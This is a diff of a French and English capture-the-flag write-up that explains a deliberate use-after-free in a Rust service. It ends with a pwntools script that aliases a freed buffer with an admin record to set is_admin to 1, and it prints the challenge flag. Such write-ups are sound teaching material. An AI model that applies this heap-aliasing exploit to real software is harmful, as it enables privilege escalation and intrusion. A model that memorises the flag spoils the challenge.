@@ -1,4 +1,4 @@
-# Unsound Memories -- Flag 2
+# Unsound Memories -- Flag 1
 
 ## Write-up (FR)
 
@@ -15,7 +15,7 @@ pub fn admin_flag<W: Write>(&mut self, index: usize, w: &mut W) -> Result<(), Er
     match self.admins.get_mut(index) {
         Some(Some(admin)) => {
             if admin.is_admin == 1 {
-                let flag = std::env::var("FLAG1").expect("FLAG1 not set");
+                let flag = std::env::var("FLAG1").expect("FLAG1 not set -- Contact organizers");
                 writeln!(w, "Congratulations! {}", flag)?;
                 Ok(())
             } else {
@@ -159,15 +159,16 @@ Examinons maintenant la structure administrateur :
 ```rs
 #[repr(C)]
 pub struct AdminRecord {
-    is_admin: u64,
-    username: [u8; BUFFER_SIZE - 8],
+    is_admin: u64,                    // offset 0
+    callback: Option<fn(*const u8)>,  // offset 8
+    username: [u8; BUFFER_SIZE - 16], // offset 16
 }
 ```
 
 Sa taille est :
 
 ```text
-8 + (144 - 8) = 144 octets
+8 + 8 + (144 - 16) = 144 octets
 ```
 
 Les deux objets possèdent exactement la même taille.
@@ -233,38 +234,41 @@ admin.is_admin == 1
 
 La vérification d'autorisation est satisfaite.
 
+> [!Note]
+> Le champ `callback` (offset 8) n'est pas touché par cette écriture.
+> Il sera la clé du Flag 2 -- ici, on se contente de l'offset 0.
+
 ### Compréhension du protocole
 
 Avant d'écrire l'exploit, il faut comprendre comment le programme lit les données.
 
-La fonction :
-
-```rs
-fn prompt_bytes(...)
-```
-
-demande d'abord une taille :
+La fonction `prompt_bytes` demande d'abord une longueur :
 
 ```text
-Enter data (hex):
+Enter length:
 ```
 
-puis lit exactement ce nombre d'octets :
+puis lit exactement ce nombre d'octets bruts :
 
 ```rs
 r.read_exact(&mut buf)?;
 ```
 
-Le message est trompeur : les données ne sont pas interprétées comme du texte hexadécimal.
-Le programme lit directement des octets bruts.
+puis avale la ligne suivante :
 
-Nous pouvons donc envoyer le résultat de :
+```rs
+let mut discard = String::new();
+r.read_line(&mut discard)?;
+```
+
+Les données ne sont pas du texte hexadecimal : ce sont des octets bruts,
+précédés de leur longueur. On peut donc envoyer directement le résultat de :
 
 ```python
 struct.pack("<Q", 1)
 ```
 
-sans aucun encodage supplémentaire.
+suivi d'un saut de ligne (consommé par `read_line`).
 
 ### Construction de l'exploit
 
@@ -291,7 +295,7 @@ pub fn admin_flag<W: Write>(&mut self, index: usize, w: &mut W) -> Result<(), Er
     match self.admins.get_mut(index) {
         Some(Some(admin)) => {
             if admin.is_admin == 1 {
-                let flag = std::env::var("FLAG").expect("FLAG not set");
+                let flag = std::env::var("FLAG1").expect("FLAG1 not set -- Contact organizers");
                 writeln!(w, "Congratulations! {}", flag)?;
                 Ok(())
             } else {
@@ -303,7 +307,7 @@ pub fn admin_flag<W: Write>(&mut self, index: usize, w: &mut W) -> Result<(), Er
 }
 ```
 
-we can see that the flag is only revealed when the administrator record has:
+the flag is only revealed when:
 
 ```rs
 admin.is_admin == 1
@@ -313,11 +317,9 @@ Our objective therefore becomes modifying this value.
 
 ### Looking for a Write Primitive
 
-Administrator records can be created and displayed, but there is no legitimate way to modify `is_admin`.
-
-We therefore need another functionality capable of writing into an administrator object.
-
-The interesting candidates are:
+Administrator records can be created and displayed, but there is no legitimate
+way to modify `is_admin`. We need another function capable of writing into an
+administrator object. The interesting candidates are:
 
 ```rs
 pub fn log_edit(...)
@@ -330,38 +332,29 @@ pub fn ref_edit(...)
 Vec<&'static mut [u8; BUFFER_SIZE]>
 ```
 
-This raises an important question:
+Which raises the question:
 
 > Where do these references come from?
 
 ### Investigating alloc_ref()
 
-References are created through:
-
-```rs
-alloc_ref()
-```
-
-which returns:
+References are created through `alloc_ref()`, which returns:
 
 ```rs
 &'static mut [u8; BUFFER_SIZE]
 ```
 
-Internally it performs:
+Internally:
 
 ```rs
 let mut owned = Box::new([0u8; BUFFER_SIZE]);
 cache_ref(owned.as_mut())
 ```
 
-Returning a `'static` reference to a locally allocated object is highly suspicious.
-
-Normally this would require a deliberate memory leak.
+Returning a `'static` reference to a locally allocated object is highly
+suspicious -- normally this would require a deliberate leak.
 
 ### Investigating cache_ref()
-
-The function:
 
 ```rs
 fn cache_ref<'call, 'extended, T: ?Sized>(
@@ -369,37 +362,17 @@ fn cache_ref<'call, 'extended, T: ?Sized>(
 ) -> &'extended mut T
 ```
 
-artificially transforms one lifetime into another.
+artificially transforms one lifetime into another, convincing the compiler that a
+short-lived reference can outlive the object it points to.
 
-This lifetime trick convinces the compiler that a short-lived reference can outlive the object it points to.
-
-As a consequence:
-
-```rs
-alloc_ref()
-```
-
-returns a reference to memory that will be freed immediately afterwards.
-
-The stored reference becomes a dangling pointer.
+As a result, `alloc_ref()` returns a reference to memory freed immediately
+afterwards. The stored reference becomes a dangling pointer.
 
 We have identified a Use-After-Free vulnerability.
 
 ### Finding an Exploitation Target
 
-The freed allocation created by `alloc_ref()` is:
-
-```rs
-Box<[u8; BUFFER_SIZE]>
-```
-
-with:
-
-```rs
-BUFFER_SIZE = 144
-```
-
-Therefore the allocation size is:
+The freed allocation is `Box<[u8; BUFFER_SIZE]>` with `BUFFER_SIZE = 144`, so:
 
 ```text
 144 bytes
@@ -410,96 +383,66 @@ Now consider:
 ```rs
 #[repr(C)]
 pub struct AdminRecord {
-    is_admin: u64,
-    username: [u8; BUFFER_SIZE - 8],
+    is_admin: u64,                    // offset 0
+    callback: Option<fn(*const u8)>,  // offset 8
+    username: [u8; BUFFER_SIZE - 16], // offset 16
 }
 ```
 
 Its size is:
 
 ```text
-8 + (144 - 8) = 144 bytes
+8 + 8 + (144 - 16) = 144 bytes
 ```
 
-Both allocations have exactly the same size.
-
-This means the allocator is very likely to recycle the freed chunk when a new administrator record is allocated.
-
-The dangling reference can therefore end up pointing directly at an `AdminRecord`.
+Both allocations have exactly the same size, so the allocator is very likely to
+recycle the freed chunk when a new administrator record is allocated. The
+dangling reference can therefore end up pointing directly at an `AdminRecord`.
 
 ### Overwriting is_admin
 
-Because the structure uses:
+Because of `#[repr(C)]`, the layout is predictable. The first field is:
 
 ```rs
-#[repr(C)]
+is_admin: u64   // offset 0
 ```
 
-its layout is predictable.
-
-The first field is:
-
-```rs
-is_admin: u64
-```
-
-located at offset zero.
-
-Writing to the first eight bytes of the dangling reference directly modifies:
-
-```rs
-admin.is_admin
-```
-
-The required value is:
-
-```text
-1
-```
-
-which can be generated using:
+Writing the first eight bytes of the dangling reference directly modifies
+`admin.is_admin`. The required value is `1`:
 
 ```python
-struct.pack("<Q", 1)
+struct.pack("<Q", 1)   # 01 00 00 00 00 00 00 00
 ```
 
-After the overwrite:
+After the overwrite, `admin.is_admin == 1` and the check succeeds.
 
-```rs
-admin.is_admin == 1
-```
-
-and the privilege check succeeds.
+> Note: the `callback` field (offset 8) is left untouched here. It is the key to
+> Flag 2 -- for Flag 1 we only need offset 0.
 
 ### Understanding the Protocol
 
-Before writing an exploit, we need to understand how user input is parsed.
+`prompt_bytes` first reads a length:
 
-The function:
-
-```rs
-prompt_bytes(...)
+```text
+Enter length:
 ```
 
-first reads a size and then reads exactly that many raw bytes:
+then reads exactly that many raw bytes:
 
 ```rs
 r.read_exact(&mut buf)?;
 ```
 
-Despite the prompt saying:
+then consumes the trailing line:
 
-```text
-Enter data (hex):
+```rs
+r.read_line(&mut discard)?;
 ```
 
-the input is not interpreted as hexadecimal text.
-
-Raw binary bytes can therefore be sent directly.
+The input is raw length-prefixed bytes, not hex text. We send
+`struct.pack("<Q", 1)` followed by a newline (consumed by `read_line`).
 
 ### Building the Exploit
-
-The final exploit performs the following actions:
 
 1. Create a dangling reference.
 2. Allocate an administrator record.
@@ -509,24 +452,37 @@ The final exploit performs the following actions:
 
 ## Exploit
 
+Le service lit des octets bruts via `prompt_bytes`, ce qui rend `pwntools`
+ideal : chaque interaction est une reponse au menu, suivie d'un payload binaire
+pour `ref_edit`.
+
 ```python
-python3 -c "
-import sys
 import struct
+from pwn import *
 
-sys.stdout.buffer.write(b'5\n')
-sys.stdout.buffer.write(b'8\n')
+HOST = args.HOST or "localhost"
+PORT = int(args.PORT or 1337)
 
-sys.stdout.buffer.write(b'7\n0\n8\n')
-sys.stdout.buffer.write(struct.pack('<Q', 1))
-sys.stdout.buffer.write(b'\n')
+p = remote(HOST, PORT)
 
-sys.stdout.buffer.write(b'9\n0\n')
-sys.stdout.buffer.write(b'11\n0\n')
-sys.stdout.buffer.write(b'0\n')
-" | nc localhost 1337
+p.sendline(b"5")               # ref_new   -> refs[0]
+p.sendline(b"8")               # admin_new -> aliase le bloc du ref
+
+p.sendline(b"7")               # ref_edit
+p.sendline(b"0")               # index ref
+p.sendline(b"8")               # longueur
+p.send(struct.pack("<Q", 1))   # is_admin = 1
+p.send(b"\n")                  # termine la ligne d'octets bruts
+
+p.sendline(b"11")              # admin_flag
+p.sendline(b"0")
+
+p.recvuntil(b"Congratulations! ")
+flag = p.recvline().strip()
+log.success(f"Flag : {flag.decode(errors='replace')}")
+p.close()
 ```
 
 ## Flag
 
-`DCI{N4n0L0g_Adm1n_Byp4ss_9a6295810c1b}`
+`DCI{N4n0L0g_Adm1n_Byp4ss_b14b12bbcc2b}`
